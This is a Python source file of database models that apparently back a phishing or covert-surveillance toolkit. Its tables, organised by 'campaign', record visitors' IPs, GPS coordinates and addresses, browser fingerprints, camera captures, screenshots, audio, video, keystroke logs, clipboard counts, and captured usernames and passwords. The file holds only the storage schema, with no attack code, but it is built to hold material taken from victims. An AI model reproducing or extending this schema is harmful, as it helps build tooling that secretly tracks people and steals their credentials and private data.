from app.database import db
from datetime import datetime


class Session(db.Model):
    __tablename__ = "sessions"
    id = db.Column(db.Integer, primary_key=True)
    ts = db.Column(db.String(32), unique=True, index=True, nullable=False)
    waktu = db.Column(db.String(32))
    campaign = db.Column(db.String(64), default="default", index=True)
    ip_koneksi = db.Column(db.String(64))
    ip_publik = db.Column(db.String(64))
    ip_lokal = db.Column(db.String(255))
    country = db.Column(db.String(64))
    city = db.Column(db.String(64))
    region = db.Column(db.String(64))
    isp = db.Column(db.String(128))
    is_vpn = db.Column(db.Integer, default=0)
    lat = db.Column(db.Float)
    lon = db.Column(db.Float)
    akurasi_m = db.Column(db.Float)
    alamat = db.Column(db.Text)
    user_agent = db.Column(db.Text)
    fingerprint = db.Column(db.Text)
    visitor_id = db.Column(db.String(64), index=True)
    has_depan = db.Column(db.Integer, default=0)
    has_belakang = db.Column(db.Integer, default=0)
    has_screenshot = db.Column(db.Integer, default=0)
    has_audio = db.Column(db.Integer, default=0)
    has_video = db.Column(db.Integer, default=0)
    burst_count = db.Column(db.Integer, default=0)
    keylog_count = db.Column(db.Integer, default=0)
    clipboard_count = db.Column(db.Integer, default=0)
    created_at = db.Column(db.DateTime, default=datetime.utcnow, index=True)

    def to_dict(self):
        import json
        d = {c.name: getattr(self, c.name) for c in self.__table__.columns}
        if d.get("created_at"):
            d["created_at"] = d["created_at"].isoformat()
        try:
            d["fingerprint_obj"] = json.loads(d.get("fingerprint") or "{}")
        except Exception:
            d["fingerprint_obj"] = {}
        return d


class Event(db.Model):
    __tablename__ = "events"
    id = db.Column(db.Integer, primary_key=True)
    session_ts = db.Column(db.String(32), index=True)
    event_type = db.Column(db.String(32))
    data = db.Column(db.Text)
    created_at = db.Column(db.DateTime, default=datetime.utcnow)


class BurstPhoto(db.Model):
    __tablename__ = "burst_photos"
    id = db.Column(db.Integer, primary_key=True)
    session_ts = db.Column(db.String(32), index=True)
    filename = db.Column(db.String(255))
    frame_num = db.Column(db.Integer)
    created_at = db.Column(db.DateTime, default=datetime.utcnow)


class Keylog(db.Model):
    __tablename__ = "keylogs"
    id = db.Column(db.Integer, primary_key=True)
    session_ts = db.Column(db.String(32), index=True)
    key = db.Column(db.String(255))
    target = db.Column(db.String(64))
    created_at = db.Column(db.DateTime, default=datetime.utcnow)


class Credential(db.Model):
    __tablename__ = "credentials"
    id = db.Column(db.Integer, primary_key=True)
    session_ts = db.Column(db.String(32), index=True)
    username = db.Column(db.String(255))
    password = db.Column(db.String(255))
    source = db.Column(db.String(64))
    created_at = db.Column(db.DateTime, default=datetime.utcnow)
